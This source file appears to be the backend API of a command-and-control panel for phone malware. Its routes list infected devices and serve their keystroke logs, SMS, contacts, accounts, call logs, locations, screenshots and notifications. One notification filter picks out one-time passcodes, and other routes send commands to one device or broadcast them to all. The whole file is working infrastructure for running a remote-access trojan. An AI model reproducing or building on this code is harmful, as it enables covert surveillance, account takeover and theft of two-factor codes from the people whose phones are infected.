'use strict';
const router                   = require('express').Router();
const { all, get, run }        = require('../core/db');
const { devices, enqueueCmd, broadcast } = require('../core/hub');

const p  = (s, fb = null) => { try { return JSON.parse(s); } catch { return fb; } };
const lim = (v, max = 500) => Math.min(parseInt(v) || 100, max);

// ══════════════════════════════════════════════════════════════════════════════
//  DEVICES
// ══════════════════════════════════════════════════════════════════════════════
router.get('/devices', async (_, res) => {
  const rows = await all(`SELECT * FROM devices ORDER BY online DESC, last_seen DESC`);
  res.json(rows.map(normalizeDevice));
});

router.get('/devices/:id', async (req, res) => {
  const r = await get(`SELECT * FROM devices WHERE id=?`, [req.params.id]);
  if (!r) return res.status(404).json({ error: 'Not found' });
  res.json(normalizeDevice(r));
});

router.patch('/devices/:id/alias', async (req, res) => {
  await run(`UPDATE devices SET alias=? WHERE id=?`, [req.body.alias || null, req.params.id]);
  broadcast({ type: 'device_update', id: req.params.id, patch: { alias: req.body.alias } });
  res.json({ ok: true });
});

router.patch('/devices/:id/tags', async (req, res) => {
  const tags = JSON.stringify(Array.isArray(req.body.tags) ? req.body.tags : []);
  await run(`UPDATE devices SET tags=? WHERE id=?`, [tags, req.params.id]);
  res.json({ ok: true });
});

router.delete('/devices/:id', async (req, res) => {
  const id = req.params.id;
  await Promise.all([
    run(`DELETE FROM devices WHERE id=?`, [id]),
    run(`DELETE FROM events WHERE dev_id=?`, [id]),
    run(`DELETE FROM keylogs WHERE dev_id=?`, [id]),
    run(`DELETE FROM device_sms WHERE dev_id=?`, [id]),
    run(`DELETE FROM device_contacts WHERE dev_id=?`, [id]),
    run(`DELETE FROM device_apps WHERE dev_id=?`, [id]),
    run(`DELETE FROM device_accounts WHERE dev_id=?`, [id]),
    run(`DELETE FROM device_location WHERE dev_id=?`, [id]),
    run(`DELETE FROM files WHERE dev_id=?`, [id]),
    run(`DELETE FROM cmd_queue WHERE dev_id=?`, [id]),
  ]);
  broadcast({ type: 'device_deleted', id });
  res.json({ ok: true });
});

// ── Device data endpoints ─────────────────────────────────────────────────────
router.get('/devices/:id/sms', async (req, res) => {
  const r = await get(`SELECT data, ts FROM device_sms WHERE dev_id=?`, [req.params.id]);
  res.json({ ts: r?.ts, data: p(r?.data, []) });
});

router.get('/devices/:id/contacts', async (req, res) => {
  const r = await get(`SELECT data, ts FROM device_contacts WHERE dev_id=?`, [req.params.id]);
  res.json({ ts: r?.ts, data: p(r?.data, []) });
});

router.get('/devices/:id/apps', async (req, res) => {
  const r = await get(`SELECT data, ts FROM device_apps WHERE dev_id=?`, [req.params.id]);
  res.json({ ts: r?.ts, data: p(r?.data, []) });
});

router.get('/devices/:id/accounts', async (req, res) => {
  const r = await get(`SELECT data, ts FROM device_accounts WHERE dev_id=?`, [req.params.id]);
  res.json({ ts: r?.ts, data: p(r?.data, []) });
});

router.get('/devices/:id/location', async (req, res) => {
  const rows = await all(
    `SELECT lat, lng, accuracy, address, ts FROM device_location
     WHERE dev_id=? ORDER BY ts DESC LIMIT 50`,
    [req.params.id]
  );
  res.json(rows);
});

router.get('/devices/:id/events', async (req, res) => {
  const rows = await all(
    `SELECT * FROM events WHERE dev_id=? ORDER BY ts DESC LIMIT ?`,
    [req.params.id, lim(req.query.limit, 1000)]
  );
  res.json(rows.map(r => ({ ...r, data: p(r.data) })));
});

router.get('/devices/:id/keylogs', async (req, res) => {
  const rows = await all(
    `SELECT * FROM keylogs WHERE dev_id=? ORDER BY ts DESC LIMIT ?`,
    [req.params.id, lim(req.query.limit, 2000)]
  );
  res.json(rows);
});

router.get('/devices/:id/queue', async (req, res) => {
  const rows = await all(`SELECT * FROM cmd_queue WHERE dev_id=? ORDER BY id ASC`, [req.params.id]);
  res.json(rows.map(r => ({ ...r, args: p(r.args, {}) })));
});

router.delete('/devices/:id/queue', async (req, res) => {
  await run(`DELETE FROM cmd_queue WHERE dev_id=?`, [req.params.id]);
  res.json({ ok: true });
});

// ══════════════════════════════════════════════════════════════════════════════
//  EVENTS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/events', async (req, res) => {
  const limit  = lim(req.query.limit, 1000);
  const offset = parseInt(req.query.offset) || 0;
  const devId  = req.query.dev_id;
  const type   = req.query.type;

  let sql = `SELECT * FROM events WHERE 1=1`;
  const p2 = [];
  if (devId) { sql += ` AND dev_id=?`; p2.push(devId); }
  if (type)  { sql += ` AND type=?`;   p2.push(type);  }
  sql += ` ORDER BY ts DESC LIMIT ? OFFSET ?`;
  p2.push(limit, offset);

  const rows = await all(sql, p2);
  res.json(rows.map(r => ({ ...r, data: p(r.data) })));
});

// ══════════════════════════════════════════════════════════════════════════════
//  KEYLOGS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/keylogs', async (req, res) => {
  const limit = lim(req.query.limit, 2000);
  const devId = req.query.dev_id;
  const app   = req.query.app;
  let sql = `SELECT * FROM keylogs WHERE 1=1`;
  const p2 = [];
  if (devId) { sql += ` AND dev_id=?`; p2.push(devId); }
  if (app)   { sql += ` AND app=?`;    p2.push(app);   }
  sql += ` ORDER BY ts DESC LIMIT ?`;
  p2.push(limit);
  res.json(await all(sql, p2));
});

// ══════════════════════════════════════════════════════════════════════════════
//  FILES
// ══════════════════════════════════════════════════════════════════════════════
router.get('/files', async (req, res) => {
  const devId = req.query.dev_id;
  let sql = `SELECT * FROM files WHERE 1=1`;
  const p2 = [];
  if (devId) { sql += ` AND dev_id=?`; p2.push(devId); }
  sql += ` ORDER BY ts DESC LIMIT 1000`;
  res.json(await all(sql, p2));
});

// ══════════════════════════════════════════════════════════════════════════════
//  STATS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/stats', async (_, res) => {
  const [total, online, evts, kls, queued] = await Promise.all([
    get(`SELECT COUNT(*) n FROM devices`),
    get(`SELECT COUNT(*) n FROM devices WHERE online=1`),
    get(`SELECT COUNT(*) n FROM events`),
    get(`SELECT COUNT(*) n FROM keylogs`),
    get(`SELECT COUNT(*) n FROM cmd_queue`)
  ]);
  res.json({
    total_devices:  total?.n  || 0,
    online_devices: online?.n || 0,
    total_events:   evts?.n   || 0,
    total_keylogs:  kls?.n    || 0,
    queued_cmds:    queued?.n  || 0,
    live_operators: require('../core/hub').operators.size
  });
});

// ══════════════════════════════════════════════════════════════════════════════
//  COMMANDS
// ══════════════════════════════════════════════════════════════════════════════
router.post('/cmd', async (req, res) => {
  const { target, cmd, args = {} } = req.body;
  if (!target || !cmd) return res.status(400).json({ error: 'target and cmd required' });

  const ws = devices.get(target);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'cmd', cmd, args }));
    return res.json({ ok: true, delivered: true });
  }

  // Offline — queue it
  await enqueueCmd(target, cmd, args);
  res.json({ ok: true, delivered: false, queued: true });
});

router.post('/cmd/broadcast', async (req, res) => {
  const { cmd, args = {} } = req.body;
  if (!cmd) return res.status(400).json({ error: 'cmd required' });
  const msg = JSON.stringify({ type: 'cmd', cmd, args });
  let sent = 0;
  for (const ws of devices.values()) {
    if (ws.readyState === 1) { ws.send(msg); sent++; }
  }
  res.json({ ok: true, sent });
});

// ══════════════════════════════════════════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════════════════════════════════════════
function normalizeDevice(r) {
  return {
    ...r,
    info:   p(r.info, {}),
    tags:   p(r.tags, []),
    online: r.online === 1,
    vnc_active: r.vnc_active === 1
  };
}

// ══════════════════════════════════════════════════════════════════════════════
//  CALL LOGS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/devices/:id/calls', async (req, res) => {
  const r = await get('SELECT data, ts FROM device_calls WHERE dev_id=?', [req.params.id]);
  res.json({ ts: r?.ts, data: p(r?.data, []) });
});

router.post('/devices/:id/calls/refresh', async (req, res) => {
  const { devices, enqueueCmd } = require('../core/hub');
  const ws = devices.get(req.params.id);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'cmd', cmd: 'GET_CALL_LOGS', args: {} }));
    return res.json({ ok: true, delivered: true });
  }
  await enqueueCmd(req.params.id, 'GET_CALL_LOGS', {});
  res.json({ ok: true, delivered: false, queued: true });
});

// Screenshot thumbnail endpoint
router.get('/screenshots/:id/thumb', async (req, res) => {
  const r = await get('SELECT data FROM screenshots WHERE id=?', [req.params.id]);
  if (!r) return res.status(404).end();
  try {
    const raw  = r.data.startsWith('data:') ? r.data.split(',')[1] : r.data;
    const buf  = Buffer.from(raw, 'base64');
    res.set('Content-Type', 'image/jpeg');
    res.set('Cache-Control', 'public, max-age=3600');
    res.send(buf);
  } catch { res.status(500).end(); }
});


// ══════════════════════════════════════════════════════════════════════════════
//  DETECTION
// ══════════════════════════════════════════════════════════════════════════════
router.get('/detections', async (req, res) => {
  const devId = req.query.dev_id;
  const cat   = req.query.category;
  let sql = `SELECT * FROM app_detections WHERE 1=1`;
  const p = [];
  if (devId) { sql += ` AND dev_id=?`; p.push(devId); }
  if (cat)   { sql += ` AND category=?`; p.push(cat); }
  sql += ` ORDER BY category, name`;
  res.json(await all(sql, p));
});

// ══════════════════════════════════════════════════════════════════════════════
//  SCREENSHOTS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/screenshots', async (req, res) => {
  const devId = req.query.dev_id;
  let sql = `SELECT id,dev_id,ts FROM screenshots WHERE 1=1`;
  const p = [];
  if (devId) { sql += ` AND dev_id=?`; p.push(devId); }
  sql += ` ORDER BY ts DESC LIMIT 200`;
  res.json(await all(sql, p));
});

router.get('/screenshots/:id', async (req, res) => {
  const r = await get(`SELECT * FROM screenshots WHERE id=?`, [req.params.id]);
  if (!r) return res.status(404).json({ error: 'Not found' });
  // Serve as image if data is base64
  const data = r.data.startsWith('data:') ? r.data : `data:image/jpeg;base64,${r.data}`;
  res.json({ ...r, data });
});

router.delete('/screenshots/:id', async (req, res) => {
  await run(`DELETE FROM screenshots WHERE id=?`, [req.params.id]);
  res.json({ ok: true });
});

// ══════════════════════════════════════════════════════════════════════════════
//  NOTIFICATIONS
// ══════════════════════════════════════════════════════════════════════════════
router.get('/notifications', async (req, res) => {
  const devId  = req.query.dev_id;
  const otpOnly = req.query.otp === '1';
  let sql = `SELECT * FROM notifications WHERE 1=1`;
  const p = [];
  if (devId)   { sql += ` AND dev_id=?`;  p.push(devId); }
  if (otpOnly) { sql += ` AND is_otp=1`; }
  sql += ` ORDER BY ts DESC LIMIT ${Math.min(parseInt(req.query.limit)||500, 2000)}`;
  res.json(await all(sql, p));
});


module.exports = router;
